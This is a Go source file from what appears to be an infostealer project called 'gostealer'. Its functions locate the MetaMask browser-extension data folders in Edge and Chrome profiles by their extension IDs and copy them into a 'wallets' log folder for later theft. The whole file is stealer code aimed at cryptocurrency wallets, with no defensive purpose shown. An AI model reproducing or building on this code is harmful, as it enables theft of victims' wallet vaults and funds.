package wallets

import (
	"path"

	"github.com/4kord/gostealer/utils"
)

func GetMetamaskEdge(browserPath, logFolderPath string) {
	//metamask edge version
	metamaske := path.Join(browserPath, "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")

	utils.CopyFolderFiles(metamaske, path.Join(logFolderPath, "wallets", "metamask_edge"))

	//metamask chrome version
	metamaskc := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")

	utils.CopyFolderFiles(metamaskc, path.Join(logFolderPath, "wallets", "metamask_edge_chromeversion"))
}

func GetMetamaskChrome(browserPath, logFolderPath string) {
	metamask := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")

	utils.CopyFolderFiles(metamask, path.Join(logFolderPath, "wallets", "metamask_chrome"))
}
